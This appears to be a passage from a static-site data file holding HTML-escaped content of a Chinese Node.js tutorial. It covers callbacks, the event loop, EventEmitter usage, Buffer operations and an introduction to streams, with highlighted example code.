class=\"hljs-keyword\">var</span> eventEmitter=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><span class=\"hljs-comment\">//创建事件处理程序</span><br><span class=\"hljs-keyword\">var</span> connectHandler=<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">connected</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;连接成功。&#x27;</span>);<br>    <span class=\"hljs-comment\">//触发data_received事件</span><br>    eventEmitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;data_received&#x27;</span>);<br>&#125;<br><span class=\"hljs-comment\">//绑定connection事件处理程序</span><br>eventEmitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,connectHandler);<br><span class=\"hljs-comment\">//使用匿名函数绑定data_received事件</span><br>eventEmitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data_received&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;数据接收成功。&#x27;</span>);<br>&#125;);<br><span class=\"hljs-comment\">//触发connection事件</span><br>eventEmitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;程序执行完毕。&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Node是如何工作的？\"><a href=\"#2-Node是如何工作的？\" class=\"headerlink\" title=\"2.Node是如何工作的？\"></a>2.Node是如何工作的？</h3><blockquote>\n<p>Node应用程序中，执行异步操作得函数将回调函数作为最后一个参数，回调函数接受错误对象作为第一个参数；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-keyword\">var</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&quot;fs&quot;</span>);<br><span class=\"hljs-comment\">//将回调函数作为最后一个参数， 回调函数接收错误对象作为第一个参数。</span><br>fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;../../assets/test.txt&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(err);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data.<span class=\"hljs-title function_\">toString</span>());<br>&#125;);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;程序执行完毕&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-EventEmitter\"><a href=\"#3-EventEmitter\" class=\"headerlink\" title=\"3.EventEmitter\"></a>3.EventEmitter</h3><blockquote>\n<p>Node.js得所有异步I/O操作都会在完成时返回一个事件到事件队列；</p>\n<p>Node.js里面得许多对象都会分发事件，所有这些事件得对象都是events.EventEmitter的实例；</p>\n</blockquote>\n<h4 id=\"EventEmitter类：事件触发与事件监听器功能的封装\"><a href=\"#EventEmitter类：事件触发与事件监听器功能的封装\" class=\"headerlink\" title=\"EventEmitter类：事件触发与事件监听器功能的封装\"></a>EventEmitter类：事件触发与事件监听器功能的封装</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> <span class=\"hljs-title class_\">EventEmitter</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>;<br><span class=\"hljs-keyword\">var</span> event=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">EventEmitter</span>();<br>event.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;some_event&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;some_event 事件触发&#x27;</span>);<br>&#125;);<br>event.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;some_event&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Martin wang 的事件触发了&quot;</span>);<br>&#125;);<br><span class=\"hljs-built_in\">setTimeout</span>(<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    event.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;some_event&#x27;</span>);<br>&#125;,<span class=\"hljs-number\">1000</span>);<br></code></pre></td></tr></table></figure>\n\n<p>原理：event对象注册了事件some_event的一个监听器，然后1000ms后向event对象发送事件some_event此时调用其监听器；</p>\n<p>EventEmitter的每个事件由一个事件名和若干参数组成，事件名是一个字符串；每个事件支持若干个事件监听器；</p>\n<p>两个事件监听器回调函数被先后调用；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">var</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-keyword\">var</span> emitter=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><br><span class=\"hljs-comment\">//监听器1</span><br><span class=\"hljs-keyword\">var</span> listener1=<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">listener1</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;监听器listener1执行&#x27;</span>);<br>&#125;   <br><span class=\"hljs-comment\">//监听器2</span><br><span class=\"hljs-keyword\">var</span> listener2=<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">listener2</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;监听器listener2执行&#x27;</span>);<br>&#125;<br><span class=\"hljs-comment\">//绑定connection事件，处理函数为listener1   </span><br>emitter.<span class=\"hljs-title function_\">addListener</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,listener1);<br><span class=\"hljs-comment\">//绑定connection事件，处理函数为listener2</span><br>emitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,listener2);<br><span class=\"hljs-keyword\">var</span> eventListeners=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>.<span class=\"hljs-title function_\">listenerCount</span>(emitter,<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(eventListeners+<span class=\"hljs-string\">&quot;个监听器监听连接事件。&quot;</span>);<br><span class=\"hljs-comment\">//处理connection事件</span><br>emitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-comment\">//移除绑定的listener1函数   </span><br>emitter.<span class=\"hljs-title function_\">removeListener</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,listener1);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;listener1不再受监听。&quot;</span>);<br><span class=\"hljs-comment\">//触发连接事件</span><br>emitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br>eventListeners=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>.<span class=\"hljs-title function_\">listenerCount</span>(emitter,<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(eventListeners+<span class=\"hljs-string\">&quot;个监听器监听连接事件。&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;程序执行完毕。&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-继承EventEmitter\"><a href=\"#4-继承EventEmitter\" class=\"headerlink\" title=\"4.继承EventEmitter\"></a>4.继承EventEmitter</h3><blockquote>\n<p>大多数时候我们不会直接使用 EventEmitter，而是在对象中继承它。包括 fs、net、 http 在内的，只要是支持事件响应的核心模块都是 EventEmitter 的子类。</p>\n<p>为什么要这样做呢？原因有两点：</p>\n<p>首先，具有某个实体功能的对象实现事件符合语义， 事件的监听和发生应该是一个对象的方法。</p>\n<p>其次 JavaScript 的对象机制是基于原型的，支持 部分多重继承，继承 EventEmitter 不会打乱对象原有的继承关系。</p>\n</blockquote>\n<h2 id=\"三、NodeJS-Buffer\"><a href=\"#三、NodeJS-Buffer\" class=\"headerlink\" title=\"三、NodeJS Buffer\"></a>三、NodeJS Buffer</h2><blockquote>\n<p>JS语言自身只有字符串数据类型，没有二进制数据类型；</p>\n<p>但是处理TCP流或者文件流时，必须使用二进制数据；因此NodeJS定义了一个Buffer类，创建一个专门存放二进制数据的缓存区；</p>\n</blockquote>\n<h3 id=\"1-Buffer与字符编码\"><a href=\"#1-Buffer与字符编码\" class=\"headerlink\" title=\"1.Buffer与字符编码\"></a>1.Buffer与字符编码</h3><blockquote>\n<p>Buffer实例一般用于表示编码字符的序列，比如UTF-8等；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> buf=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;hello world&#x27;</span>,<span class=\"hljs-string\">&#x27;ascii&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>(<span class=\"hljs-string\">&#x27;hex&#x27;</span>));<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>(<span class=\"hljs-string\">&#x27;base64&#x27;</span>));<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Buffer类\"><a href=\"#2-Buffer类\" class=\"headerlink\" title=\"2.Buffer类\"></a>2.Buffer类</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//创建长度为10字节的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf1=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">alloc</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-comment\">//创建长度为10字节，且用0填充的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf2=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">alloc</span>(<span class=\"hljs-number\">10</span>,<span class=\"hljs-number\">1</span>);<br><span class=\"hljs-comment\">//创建长度为10字节，且未初始化的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf3=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">allocUnsafe</span>(<span class=\"hljs-number\">10</span>);<br><span class=\"hljs-comment\">//创建一个包含[0x1,0x2,0x3]的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf4=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>([<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">2</span>,<span class=\"hljs-number\">3</span>]);<br><span class=\"hljs-comment\">//创建一个包含UTF-8字节[0x74,0x65,0x73,0x74]的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf5=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;test&#x27;</span>);<br><span class=\"hljs-comment\">//创建一个包含Latin-1字节[0x74,0x65,0x73,0x74]的Buffer实例</span><br><span class=\"hljs-keyword\">const</span> buf6=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;test&#x27;</span>,<span class=\"hljs-string\">&#x27;latin1&#x27;</span>);<br><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-写入缓冲区\"><a href=\"#3-写入缓冲区\" class=\"headerlink\" title=\"3.写入缓冲区\"></a>3.写入缓冲区</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">buf.<span class=\"hljs-title function_\">write</span>(string[,offset[,length]][,encoding])<br><span class=\"hljs-comment\">// string 字符串</span><br><span class=\"hljs-comment\">// offset 开始写入的索引值</span><br><span class=\"hljs-comment\">// length 写入的字节数</span><br><span class=\"hljs-comment\">// encoding 编码方式</span><br>buf.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&#x27;hello world&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toJSON</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buf.<span class=\"hljs-title function_\">toString</span>(<span class=\"hljs-string\">&#x27;base64&#x27;</span>));<br><span class=\"hljs-comment\">//缓冲区合并</span><br><span class=\"hljs-keyword\">const</span> buffer1=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>((<span class=\"hljs-string\">&#x27;菜鸟教程&#x27;</span>));<br><span class=\"hljs-keyword\">const</span> buffer2=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>((<span class=\"hljs-string\">&#x27;www.runoob.com&#x27;</span>));<br><span class=\"hljs-keyword\">const</span> buffer3=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">concat</span>([buffer1,buffer2]);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;buffer3 内容: &quot;</span>+buffer3.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-comment\">//缓冲区比较</span><br><span class=\"hljs-keyword\">const</span> buffer4=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;ABC&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> buffer5=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;ABCD&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> result=buffer4.<span class=\"hljs-title function_\">compare</span>(buffer5);<br><span class=\"hljs-keyword\">if</span>(result&lt;<span class=\"hljs-number\">0</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buffer4+<span class=\"hljs-string\">&quot;在&quot;</span>+buffer5+<span class=\"hljs-string\">&quot;之前&quot;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(result==<span class=\"hljs-number\">0</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buffer4+<span class=\"hljs-string\">&quot;与&quot;</span>+buffer5+<span class=\"hljs-string\">&quot;相同&quot;</span>);<br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(buffer4+<span class=\"hljs-string\">&quot;在&quot;</span>+buffer5+<span class=\"hljs-string\">&quot;之后&quot;</span>);<br>&#125;<br><span class=\"hljs-comment\">//拷贝缓冲区</span><br><span class=\"hljs-keyword\">const</span> buffer6=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;ABC&#x27;</span>);<br><span class=\"hljs-comment\">//拷贝一个缓冲区</span><br><span class=\"hljs-keyword\">const</span> buffer7=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">alloc</span>(<span class=\"hljs-number\">3</span>);<br>buffer6.<span class=\"hljs-title function_\">copy</span>(buffer7);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;buffer7 content: &quot;</span>+buffer7.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-comment\">//缓冲区裁剪</span><br><span class=\"hljs-keyword\">const</span> buffer8=<span class=\"hljs-title class_\">Buffer</span>.<span class=\"hljs-title function_\">from</span>(<span class=\"hljs-string\">&#x27;runoob&#x27;</span>);<br><span class=\"hljs-comment\">//剪切缓冲区</span><br><span class=\"hljs-keyword\">const</span> buffer9=buffer8.<span class=\"hljs-title function_\">slice</span>(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">2</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;buffer9 content: &quot;</span>+buffer9.<span class=\"hljs-title function_\">toString</span>());<br></code></pre></td></tr></table></figure>\n\n<p>方法名参考JS的字符串处理；</p>\n<h2 id=\"四、NodeJS-Stream\"><a href=\"#四、NodeJS-Stream\" class=\"headerlink\" title=\"四、NodeJS Stream\"></a>四、NodeJS Stream</h2><blockquote>\n<p>Stream是一个抽象接口，node中很多对象实现了这个接口；</p>\n<p>例如对http服务器发起请求的request对象就是一个stream还有stdout；</p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Node-JS-From-W3C\"><a href=\"#Node-JS-From-W3C\" class=\"headerlink\" title=\"Node JS From W3C\"></a>Node JS From W3C</h1><h2 id=\"一、NodeJS回调函数\"><a href=\"#一、NodeJS回调函数\" class=\"headerlink\" title=\"一、NodeJS回调函数\"></a>一、NodeJS回调函数</h2><blockquote>\n<p>异步编程依托于回调来实现；</p>\n<p>回调函数完成任务后会被调用，Node使用了大量得回调函数，Node所有Api都支持回调函数；</p>\n<p>例如，我们可以一边读取文件，一边执行其他命令，在文件读取完成后，我们将文件内容作为回调函数的参数返回。这样在执行代码时就没有阻塞或等待文件 I/O 操作。这就大大提高了 Node.js 的性能，可以处理大量的并发请求。</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">foo1</span>(<span class=\"hljs-params\">name,age,callback</span>)&#123;&#125;<br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">foo2</span>(<span class=\"hljs-params\">value,callback1,callback2</span>)&#123;&#125;<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//阻塞代码实例</span><br><span class=\"hljs-keyword\">var</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&quot;fs&quot;</span>);<br><span class=\"hljs-keyword\">var</span> data=fs.<span class=\"hljs-title function_\">readFileSync</span>(<span class=\"hljs-string\">&#x27;../../assets/test.txt&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data.<span class=\"hljs-title function_\">toString</span>());<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Program Ended&quot;</span>);<br><br><br><span class=\"hljs-comment\">//非阻塞代码实例</span><br><span class=\"hljs-keyword\">var</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&quot;fs&quot;</span>);<br>fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;../../assets/test.txt&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">err,data</span>)&#123;<br>    <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(err);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(data.<span class=\"hljs-title function_\">toString</span>());<br>&#125;);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Program Ended&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<p>第一个实例在文件读取完之后才执行；第二个实例我们不需要等待文件读取完；可以在读取文件的同时处理其他逻辑；</p>\n<h2 id=\"二、NodeJS事件循环\"><a href=\"#二、NodeJS事件循环\" class=\"headerlink\" title=\"二、NodeJS事件循环\"></a>二、NodeJS事件循环</h2><h3 id=\"1-events\"><a href=\"#1-events\" class=\"headerlink\" title=\"1.events\"></a>1.events</h3><blockquote>\n<p>NodeJS是单进程单线程应用程序，但是因为V8引擎提供得异步执行回调接口，通过这些接口可以处理大量并发，性能较高；</p>\n<p>Node.js 基本上所有的事件机制都是用设计模式中观察者模式实现。</p>\n<p>Node.js 单线程类似进入一个while(true)的事件循环，直到没有事件观察者退出，每个异步事件都生成一个事件观察者，如果有事件发生就调用该回调函数.</p>\n<p>Node.js使用事件驱动模型，当web server接收到请求，就把它关闭进行处理，然后服务下一个web请求；</p>\n<p>请求完成，放回处理队列，当到达队列开头，将结果返回给用户；</p>\n<p>webserver 一直接受请求而不等待任何读写操作。（这也称之为非阻塞式IO或者事件驱动IO）</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//引入events模块；</span><br><span class=\"hljs-keyword\">var</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-comment\">//创建eventEmitter对象</span><br><span class=\"hljs-keyword\">var</span> eventEmitter=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><br><span class=\"hljs-comment\">//绑定事件及事件得处理程序</span><br>eventEmitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;eventName&#x27;</span>,eventHandler);<br><br><span class=\"hljs-comment\">//触发事件</span><br>eventEmitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;eventName&#x27;</span>);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//引入events模块</span><br><span class=\"hljs-keyword\">var</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-comment\">//创建eventEmitter对象</span><br><span class=\"hljs-keyword\">var</span> eventEmitter=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><span class=\"hljs-comment\">//创建事件处理程序</span><br><span class=\"hljs-keyword\">var</span> connectHandler=<span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">connected</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;连接成功。&#x27;</span>);<br>    <span class=\"hljs-comment\">//触发data_received事件</span><br>    eventEmitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;data_received&#x27;</span>);<br>&#125;<br><span class=\"hljs-comment\">//绑定connection事件处理程序</span><br>eventEmitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>,connectHandler);<br><span class=\"hljs-comment\">//使用匿名函数绑定data_received事件</span><br>eventEmitter.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data_received&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;数据接收成功。&#x27;</span>);<br>&#125;);<br><span class=\"hljs-comment\">//触发connection事件</span><br>eventEmitter.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;connection&#x27;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;程序执行完毕。&quot;</span>);<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Node是如何工作的？\"><a href=\"#2-Node是如何工作的？\" class=\"headerlink\" title=\"2.Node是如何工作的？\"></a>2.Node是如何工作的？</h3><blockquote>\n<p>Node应用程序中，执行异步操作得函数将回调函数作为最后一个参数，回调函数接受错误对象作为第一个参数；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td 